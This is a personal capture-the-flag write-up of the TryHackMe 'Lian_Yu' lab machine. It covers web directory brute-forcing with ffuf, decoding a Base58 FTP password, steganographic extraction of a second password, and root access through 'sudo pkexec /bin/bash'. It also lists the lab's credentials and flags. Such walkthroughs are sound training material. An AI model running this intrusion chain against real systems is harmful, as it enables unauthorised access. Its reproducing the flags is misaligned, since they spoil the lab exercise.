---
creation date: July 21st 2023
last modified date: July 21st 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Lian_Yu]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
41104/tcp open  unknown
```

Enumerated open TCP ports:
```bash
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39033/udp   status
|   100024  1          39296/tcp6  status
|   100024  1          41104/tcp   status
|_  100024  1          42660/udp6  status
41104/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80
#### ffuf scan of - /FUZZ
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.123.154/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 189ms]
    * FUZZ: island

[Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 189ms]
    * FUZZ: 

[Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 187ms]
    * FUZZ: server-status

:: Progress: [207629/207629] :: Job [1/1] :: 1074 req/sec :: Duration: [0:03:17] :: Errors: 0 ::
```

- */island*
```/island
# Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to **Lian_Yu** as we are planed. The Code Word is:

## vigilante
```
- **vigilante** was hidden written in white text


#### ffuf scan of - /island/FUZZ
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.123.154/island/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 241, Words: 14, Lines: 8, Duration: 189ms]
    * FUZZ: 2100

[Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 188ms]
    * FUZZ: 

:: Progress: [207629/207629] :: Job [1/1] :: 1068 req/sec :: Duration: [0:03:17] :: Errors: 0 ::
```

- */island/2100*
	- Contained a video with a broken YouTube link and hidden in the HTML of the page was a comment
		- <!-- you can avail your .ticket here but how?   -->
			- Indicates that we need could be looking at a **.ticket** file extension


#### ffuf scan of - /island/2100/FUZZ.ticket
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.123.154/island/2100/FUZZ.ticket
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 189ms]
    * FUZZ: green_arrow

:: Progress: [207629/207629] :: Job [1/1] :: 1047 req/sec :: Duration: [0:03:17] :: Errors: 0 ::
```

- */island/2100/green_arrow.ticket*
```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```
- Cracking - **RTy8yhBQdscX**
	- I tried a number of things on CyberChef but **Base58** ended up giving something that looked right
		- *!#th3h00d*


## Port 21 FTP
### vigilante : !#th3h00d
- Files pulled from **/home/vigilante/**
	- *Leave_me_alone.png*
		- FileType: `Leave_me_alone.png: data`
		- Corrected corrupt header
			- Now showing an image with red text: `password`
	- *Queen's_Gambit.png*
	- *aa.jpg*
		- Used [[steghide]] to decrypt using the password we found on *Leave_me_alone.png*
			- Extracted file: *shado*
				- `M3tahuman`
				- Probably password for slade
	- *.bash_history*
		- `Sorry I couldn't Help Other user Might help`
	- *.other_user*
		- Contained Lore
- Checked **/home**
	- *slade*
		- Cant access from this account
	- *vigilante*
		- Current user
---

# Exploitation
## Name of the technique


---

# Lateral Movement to user
## Local Enumeration
### slade : M3tahuman
- `sudo -l`
	- (root) PASSWD: /usr/bin/pkexec



## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector

---

# Steps
1. Enumerate webserver subdirectories:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --recursion -u http://$RHOST/FUZZ -t 200
```
- Found directories:
	- */island*
		- HTML contained comment: `vigilante`
	- */island/2100*
		- HTML contained comment: `.ticket`

2. Using located `.ticket` from step 1 we continue enumerating:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://$RHOST/island/2100/FUZZ.ticket -t 200
```
- Found directories:
	- */island/2100/green_arrow.ticket*
		- Contained: `RTy8yhBQdscX`
			- Base58 encoded
				- `!#th3h00d`

3. Combining what we found from both step 1 & 2 we gain access to FTP server:
```FTP
vigilante : !#th3h00d
```
- We grab two files off the server of importance:
	- *Leave_me_alone.png*
		- Corrupted file had to repair with [[hexeditor]]
			- Was just replacing header to `89 50 4E 47`
		- Image contained graphicly
			- `password`
	- *aa.jpg*
		- Used password found on the other image to extract using [[steghide]]
			- *zip* file contained: `M3tahuman`

3. Taking what we found from FTP server we have gathered enough to SSH in with another user:
```SSH
slade : M3tahuman
```
- `sudo -l`
	- (root) PASSWD: /usr/bin/pkexec

4. Time to escalate our privileges:
```bash
sudo pkexec /bin/bash
```
- Success we have *ROOT*

5. Grabbing Flags:
```bash
cat /home/slade/user.txt && cat /root/root.txt
```


---

# Trophy & Loot

user.txt = *THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}*
root.txt = *THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}*

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 21st 2023 (09:44 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
